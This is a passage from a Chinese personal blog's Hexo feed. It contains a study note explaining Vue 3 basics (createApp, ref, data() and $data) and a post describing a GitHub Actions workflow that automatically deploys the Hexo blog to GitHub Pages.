    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-aUbnjitL" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1910838939" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>用Vue也写过不少项目了，科技立项的个人网盘以及这个寒假写的短链站、禁书目录等等。</p><p>但是会写了，也只是依样画葫芦，更多的是在Element Plus里复制粘贴，再加点自己的东西，没有系统的学习和了解Vue。</p><p>懒惰的武丑兄便打算给自己开个新坑，以<a href="https://v3.cn.vuejs.org/">Vue3官方文档</a>为基础，真正去理解Vue，形成更加长远的记忆。</p><p>本博客将持续更新，具体形式为提出某个问题，并对该问题进行解析。</p><h2 id="app是什么"><a class="markdownIt-Anchor" href="#app是什么"></a> app是什么</h2><p>每当我们用脚手架新建一个vue项目，脚手架会给你一个模板项目，一些固定的代码总是那样，比如下面的main.js里的代码，你一定很熟悉。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)<br>app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里面一共出现了8个app，让人眼花缭乱，让人看不懂它们到底是什么。</p><p>首先我们看第二行的<code>App</code>，它是从单文件组件 <code>App.vue</code> 里引入的，所以我们可以把App称为一个组件。而通常情况下，这个App总是最外层的，我们可以把它叫做rootComponent，即<strong>根组件</strong>，它将是渲染的起点。</p><p>再看第一行的createApp，它是从<code>vue</code>这个模块里通过ES6中的解构语法导出的一个函数。</p><p><img src="https://upyun.wuuconix.link/image-20220113202752560.png" alt="vue module" /></p><p>而第三行的app变量就是这个函数的返回值。那它是什么呢？在之前，我一直把这个app看作一个组件，因为createApp的参数里是App，是根组件。</p><p>但是查阅文档 <a href="https://v3.cn.vuejs.org/api/application-api.html#component">应用 API | Vue.js (vuejs.org)</a> 之后，我们可以知道，该函数的返回值，即这里的app，我们应该叫它为 <strong>应用实例</strong>。</p><p>这个实例可以干很多事情。</p><ol><li><p>比如全局注册一个组件，让该应用实例挂在的组件树都能够共享这个组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">AnComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/AnComponent.vue&#x27;</span><br><span class="hljs-comment">//...</span><br>app.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;AnComponent&#x27;</span>,  <span class="hljs-title class_">AnComponent</span>)<br></code></pre></td></tr></table></figure></li><li><p>使用一个插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ElementPlus</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus&#x27;</span><br><span class="hljs-comment">//...</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">ElementPlus</span>)<br>app.<span class="hljs-title function_">use</span>(router)<br></code></pre></td></tr></table></figure><p>这里就是使用了我们常见的Element Plus UI库，以及Vue Router路由，它们都是以插件的形式引入到项目中的。</p></li></ol><p>我们最后看第四行的<code>'#app'</code>。它实际上是项目 <code>public/index.html</code>里面的一个div。</p><p><img src="https://upyun.wuuconix.link/image-20220113205427613.png" alt="div #app" /></p><p>它算什么呢？我们从它给我们的注释里也可以知道，项目的根组件渲染的结果实际上是会放到这个<code>&lt;div id=&quot;app&quot;&gt;</code>中的内部的。</p><p>所以它应该被叫为 <strong>根组件实例</strong>。</p><p>我们再来重新看<code>app.mount('#app')</code>这个语句，它是把app这个应用实例绑定到了 根组件实例上了嘛？不，app这个应用实例只是一个工具人，它干的事情是，把应用实例对应的根组件绑定到了根组件实例里。</p><blockquote><p>即把App绑定到了#app上。</p></blockquote><h2 id="神秘的ref"><a class="markdownIt-Anchor" href="#神秘的ref"></a> 神秘的ref</h2><p>在写项目的时候，当我还在写类似下面的结果的时候</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Vue3已经推出了一种setup标签的语法糖，它可以让我们少些很多繁琐的结构，就比如上面的export default等等。</p><p>我还不太会写这种高阶的语法，但是我在看许多案例的时候都发现它们都使用了 vue module里面的ref，而它们干的事情好像又很简单，我就无法理解这个ref的作用。比如下面的例子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> &#123; ref &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> msg = <span class="hljs-title function_">ref</span>(<span class="hljs-string">&#x27;Hello World!&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>你可以把这段代码复制到 <a href="https://sfc.vuejs.org/">Vue SFC PlayGround</a> 里进行尝试。该单文件组件的功能就是将input输入的内容和msg绑定起来，输入框的内容一变，msg变量就会变。</p><p><img src="https://upyun.wuuconix.link/image-20220113212146134.png" alt="v-model msg" /></p><p>我们注意到，msg变量定义的时候，用的是const，按理说msg的值是不可以改变的，除非它是一个对象。所以ref的返回值是一个对象。</p><p>通过查阅 <a href="https://v3.cn.vuejs.org/api/refs-api.html#ref">Refs | Vue.js (vuejs.org)</a> 文档，我们印证了这个观点。</p><blockquote><p>文档：ref接受一个内部值并返回一个响应式且可变的 ref 对象。ref 对象仅有一个 <code>.value</code> property，指向该内部值。</p></blockquote><p>所以ref存在的目的就是为了实现Vue中响应式数据的特点。那为什么我们用普通的写法不需要用到ref呢？这里我将语法改写为以下。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-title function_">default</span>(&#123;</span><br><span class="language-javascript">  <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;123&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们发现，同样可以实现和之前一样的效果。</p><p><img src="https://upyun.wuuconix.link/image-20220113212936755.png" alt="普通写法" /></p><p>我们观察这个普通写法中的data 实际上返回了一个对象，msg是这个对象里的一个键，由于对象的特性，msg的值可以被随意更改，实现响应式。</p><p>而高阶语法里没有这种data对象，我们便需要用ref来创造一个只有value值的对象。实现数据的响应。</p><p>以上观点可以在Vue SFC Playground里得到印证，它向我们展示出我们这段js代码最终被编译后的样子。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        SFC After Complier    </div>    <div class='spoiler-content'>        <p><img src="https://upyun.wuuconix.link/image-20220113214826401.png" alt="$data.msg" /></p><p><img src="https://upyun.wuuconix.link/image-20220113214907874.png" alt="msg.value" /></p>    </div></div><h2 id="data-与-data"><a class="markdownIt-Anchor" href="#data-与-data"></a> data() 与 $data</h2><p>还是拿这个常见的代码举例子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里的data是什么呢？我们如果以一个没有学过js的同学的视角看，它就是一个函数，和我们在C、C++定义函数的结构一致。</p><p>它确实是个函数，但是有几点值得说明。</p><p>首先这个它在一个对象内部，因为export default 导出了一个对象 <code>&#123;&#125;</code>。按理说一个对象都是键值的形式，那它就放一个函数，它的键和值都是什么呢？</p><p>实际上这是ES6 对于对象内部方法名的一种简写，请参考 <a href="https://www.runoob.com/w3cnote/es6-object.html">3.2.3 ES6 对象 | 菜鸟教程 (runoob.com)</a>。</p><p>它实际上的样子应该是这样的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-attr">data</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就符合对象内部的键值关系了，它的键是data，它是一个function，返回值是一个对象。</p><p>我们都知道，在这个return里面定义的属性，我们可以在别的地方使用。</p><ol><li><p>比如在模板里使用插值的形式。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        插值    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; wuuconix &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">wuuconix</span>: <span class="hljs-string">&#x27;yyds&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220114104208293.png" alt="插值" /></p>    </div></div></li><li><p>再比如在methods方法里使用属性</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        methods    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span>&#123;&#123; wuuconix &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">wuuconix</span>: <span class="hljs-string">&#x27;yyds&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">wuuconix</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220114103933494.png" alt="console.log" /></p>    </div></div></li></ol><p>所以一直一来我就认为组件实例的数据就是来自data，但是它又只是个函数，不是个对象，让我觉得非常奇怪。</p><p>在阅读 <a href="https://v3.cn.vuejs.org/api/instance-properties.html#data">实例 property | Vue.js (vuejs.org)</a> 后我发现，原来还有一个<code>$data</code>的东西，它是一个<strong>实例Property</strong>，应该可以叫为实例属性。</p><p>而之前一直写的data它只是一个函数，用来返回组件实例的data对象，即$data。</p><p>所以data只是一个函数，而它的返回值，一般来说它的返回值必须是一个对象，这个对象就会成为组件实例的$data，作为一个实例属性供之后调用。</p><p>这里看了文档以后后还明白了一点，我们平常在methods里调用属性，都会写<code>this.wuuconix</code>来使用属性，那这里的this指什么呢？我以前认为应该是指向组件本身，而看了 <a href="https://v3.cn.vuejs.org/api/options-data.html#data-2">Data | Vue.js (vuejs.org)</a> 后我发现它指向的是组件实例。</p><p>那这样就引出了另一个问题，组件实例的属性都存在$data这个对象里，那为什么我们可以使用<code>this.wuuconix</code>的形式来调用组件实例的属性呢？</p><p>实际上这里vue大概是为了方便操作为我们做了一层代理。我们把vm（取义自viewModel）看作组件实例。访问<code>vm.wuuconnix</code>等价于访问<code>vm.$data.wuuconix</code>。</p><p>为了印证它，我在SFC Playground里做了测试，发现使用 this.wuuconix和this.$data.wuuconix 效果一致。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        对$data的测试    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span>&#123;&#123; wuuconix &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">wuuconix</span>: <span class="hljs-string">&#x27;yyds&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$data</span>.<span class="hljs-property">wuuconix</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220114110027612.png" alt="this.$data.wuuconix" /></p>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Github Actions 自动部署 Hexo</title>
    <link href="/2022/01/08/actions/"/>
    <url>/2022/01/08/actions/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-kMtknlAh" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1482908655" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>昨天尝试了Cloudflare的pages功能，它可以识别一个vue工程文件，然后自动build，最后自动部署给你一个域名来访问，智能地令人害怕。</p><p>于是我想，如果github也能实现类似的操作该有多好，毕竟我github上还存着不少的vue项目。</p><p>这让我想起了7att1ce给我推荐过很多次的github actions。在参考了 <a href="https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">GitHub Actions 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</a>后，我了解到github actions有一个商店 Marketplace，就在github菜单栏里。</p><p><img src="https://upyun.wuuconix.link/image-20220108134534779.png" alt="GitHub Marketplace" /></p><p>于是我搜索关键词Vue，找到了一个十分不错的acion <a href="https://github.com/marketplace/actions/vue-to-github-pages">Vue to Github Pages · Actions · GitHub Marketplace</a>，最终我把SeTu Index Project 直接部署到了github pages上。项目地址：<a href="https://github.com/wuuconix/setu">wuuconix/setu: Setu Index Project (github.com)</a>。</p><p>在实现了vue项目的自动部署后，我便想着把博客也给自动部署了。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><p>首先我同样在 商店里搜索 关键词 hexo，选取了其中最高star的acion进行了尝试，但是失败了。action的过程没有报错，但是没有上传到github.io这个pages项目里。</p><p>然后我尝试了hexo官方的github actions部署教程，发现它是把build的产物放在了源仓库里的 另一个分支里面，而github pages的开通需要仓库为public，但是博客源文件我是不想让人看见的，因为我有两篇需要密码才能看的加密文章。所以这也失败了。</p><p>最后，我学习了github action的相关语法，在参考了几个文章后，自己写了一个action，代码如下。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span>                      <span class="hljs-comment"># Actions 显示的名字，随意设置</span><br><span class="hljs-attr">on:</span> [<span class="hljs-string">push</span>]                        <span class="hljs-comment"># 监听到 push 事件后触发</span><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span>              <span class="hljs-comment"># 拉取当前执行 Actions 仓库的指定分支</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>      <span class="hljs-attr">with:</span><br>        <span class="hljs-attr">ref:</span> <span class="hljs-string">main</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Node</span>            <span class="hljs-comment"># 使用node 14</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v2</span><br>      <span class="hljs-attr">with:</span><br>        <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;14&quot;</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">NPM</span> <span class="hljs-string">INSTALL</span>           <span class="hljs-comment">#安装依赖</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        npm install hexo-cli -g</span><br><span class="hljs-string">        npm install</span><br><span class="hljs-string"></span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Add</span> <span class="hljs-string">KEY</span>               <span class="hljs-comment">#这里需要提供一个ssh私钥，用你平时常用机器里的 ~/.ssh/id_rsa即可</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-attr">SSH_PRIVATE:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.SSH_PRIVATE</span> <span class="hljs-string">&#125;&#125;</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        mkdir -p ~/.ssh/</span><br><span class="hljs-string">        echo &quot;$SSH_PRIVATE&quot; &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">        chmod 700 -R ~/.ssh</span><br><span class="hljs-string">        ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string">        git config --global user.email &quot;输入你的邮箱&quot;</span><br><span class="hljs-string">        git config --global user.name &quot;输入你的github名字&quot;</span><br><span class="hljs-string"></span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Hexo</span> <span class="hljs-string">Deploy</span>           <span class="hljs-comment"># hexo deploy 会自动build然后上传到github.io项目中</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        hexo clean</span><br><span class="hljs-string">        hexo deploy</span><br></code></pre></td></tr></table></figure><p>它的主要工作步骤是</p><ol><li><p>利用 actions/checkout@v2 拉取本项目的main分支到 action虚拟机。</p></li><li><p>利用 actions/setup-node@v2 在虚机里配置 node 14的环境。</p></li><li><p>利用npm全局安装hexo脚手架，然后 npm install安装博客的依赖。</p></li><li><p>把一个私钥给虚机（因为之后的hexo deploy）设计到对仓库的上传，我这里直接把 wsl里的 ~/.ssh/id_rsa 放到 博客源码仓库的 secrets.SSH_PRIVATE了。</p><p>这样就能保证虚机能够正常更新pages仓库。</p></li><li><p>调用hexo deploy</p></li></ol><h2 id="结果截图"><a class="markdownIt-Anchor" href="#结果截图"></a> 结果截图</h2><ol><li><p>本地git push</p><p><img src="https://upyun.wuuconix.link/image-20220108135859769.png" alt="git push" /></p></li><li><p>博客源码仓库 发现push请求，开始build，只花了40秒就完成了。</p><p><img src="https://upyun.wuuconix.link/image-20220108140010167.png" alt="build" /></p></li><li><p>pages仓库接收到变化，pages自动执行更新操作（所以github pages 自带了一个action）</p><p><img src="https://upyun.wuuconix.link/image-20220108140129825.png" alt="pages" /></p></li></ol><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>现在博客直接放 github，测试了一下访问速度，感觉和放阿里云上没有区别。</p><blockquote><p><a href="https://wuuconix.link">https://wuuconix.link</a></p></blockquote><p>而且以后本地也不用hexo g了，直接hexo s预览，预览感觉ok了，直接git push，actions会自动帮你build 和 更新pages。</p><p>十分舒适！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>github actions</tag>
      
      <tag>github pages</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mirai QQ机器人初探</title>
    <link href="/2022/01/04/mirai/"/>
    <url>/2022/01/04/mirai/</url>
    
